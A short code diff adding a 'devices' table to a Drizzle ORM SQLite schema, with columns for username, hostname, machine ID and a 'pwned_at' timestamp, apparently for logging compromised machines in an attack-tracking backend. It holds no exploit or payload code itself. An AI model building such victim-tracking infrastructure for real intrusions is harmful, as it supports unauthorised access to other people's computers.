@@ -13,3 +13,14 @@ export const sessions = sqliteTable("sessions", {
     uid: text().notNull().references(() => usersTable.id, { onDelete: 'cascade' } ),
     expires_at: int({ mode: 'timestamp_ms' }).notNull(),
 });
+
+
+export const devices = sqliteTable("devices", {
+    id:       int().primaryKey({ autoIncrement: true }),
+    sid:      text().notNull(),
+    username: text().notNull(),
+    hostname: text().notNull(),
+    model:    text().notNull(),
+    machine_id: text().notNull(),
+    pwned_at: int({ mode: 'timestamp_ms' }).notNull().$defaultFn(() => new Date()),
+});
